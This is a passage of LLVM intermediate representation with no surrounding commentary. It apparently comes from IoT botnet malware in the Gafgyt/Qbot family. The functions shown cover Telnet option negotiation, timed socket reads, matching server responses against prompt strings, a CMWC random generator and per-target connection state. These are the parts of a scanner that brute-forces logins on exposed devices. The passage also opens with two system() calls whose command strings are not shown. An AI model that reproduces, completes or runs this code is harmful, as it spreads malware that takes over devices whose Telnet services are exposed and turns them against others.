  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #9
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.133, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
